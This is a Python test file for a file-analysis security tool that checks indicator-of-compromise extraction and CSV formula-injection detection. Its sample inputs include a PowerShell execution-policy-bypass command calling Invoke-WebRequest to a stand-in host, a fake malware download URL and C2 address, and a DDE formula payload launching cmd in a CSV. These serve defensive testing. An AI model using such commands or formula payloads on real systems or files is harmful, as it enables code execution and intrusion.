import pytest
from app.file_analysis.indicator_extractor import extract_indicators_from_text
from app.file_analysis.csv_analyzer import csv_analyzer
from app.file_analysis.file_scoring import file_scoring_engine

def test_ioc_extraction():
    sample_text = """
    Please contact admin@phishcorp.xyz or download updates from http://malicious-domain.top/agent.exe.
    Server C2 IP: 198.51.100.45.
    Execute powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest http://bad.com"
    """
    iocs = extract_indicators_from_text(sample_text)
    assert "admin@phishcorp.xyz" in iocs["emails"]
    assert any("malicious-domain.top" in u for u in iocs["urls"])
    assert "198.51.100.45" in iocs["ips"]
    assert any("Command Line" in p["pattern"] or "Download" in p["pattern"] for p in iocs["suspicious_patterns"])

def test_csv_formula_injection_analysis():
    csv_content = b'Name,Amount,Command\nAlice,100,"=cmd|\'/c calc\'!A1"\nBob,200,SafeText\n'
    res = csv_analyzer.analyze(csv_content, "payroll.csv")
    assert res["metadata"]["row_count"] == 2
    assert len(res["structural_indicators"]) >= 1
    assert res["structural_indicators"][0]["type"] == "CSV_FORMULA_INJECTION"

    scored = file_scoring_engine.score_analysis(res, "CSV")
    assert scored["risk_score"] >= 40
    assert scored["classification"] in ["CAUTION", "CRITICAL"]

